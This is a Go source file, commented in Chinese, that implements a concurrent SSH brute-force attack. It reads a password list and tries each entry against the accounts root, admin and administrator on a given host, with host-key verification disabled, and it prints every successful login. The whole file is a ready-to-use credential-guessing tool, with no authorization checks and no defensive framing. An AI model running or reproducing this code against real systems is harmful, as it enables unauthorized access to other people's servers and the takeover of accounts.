package bruteforce

import (
	"bufio"
	"fmt"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// 默认账号列表
var defaultAccounts = []string{"root", "admin", "administrator"}

// Bruteforce 执行暴力破解攻击
func Bruteforce(host string, port int, passwordFile string) {
	passwords, err := readPasswords(passwordFile)
	if err != nil {
		fmt.Printf("Error reading password file: %v\n", err)
		return
	}

	var wg sync.WaitGroup
	wg.Add(len(defaultAccounts) * len(passwords))

	// 并发尝试不同的账号和密码组合
	for _, account := range defaultAccounts {
		for _, password := range passwords {
			go func(host string, port int, account string, password string) {
				defer wg.Done()
				fmt.Printf("Trying account: %s, password: %s\n", account, password)
				if sshLogin(host, port, account, password) {
					fmt.Printf("SSH login successful: %s:%s@%s\n", account, password, host)
				}
			}(host, port, account, password)
		}
	}

	wg.Wait()
}

// readPasswords 读取密码文件
func readPasswords(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {

		}
	}(file)

	var passwords []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return passwords, nil
}

// sshLogin 尝试使用SSH登录
func sshLogin(host string, port int, username, password string) bool {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	conn, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", host, port), config)
	if err != nil {
		return false
	}
	defer func(conn *ssh.Client) {
		err := conn.Close()
		if err != nil {

		}
	}(conn)
	return true
}
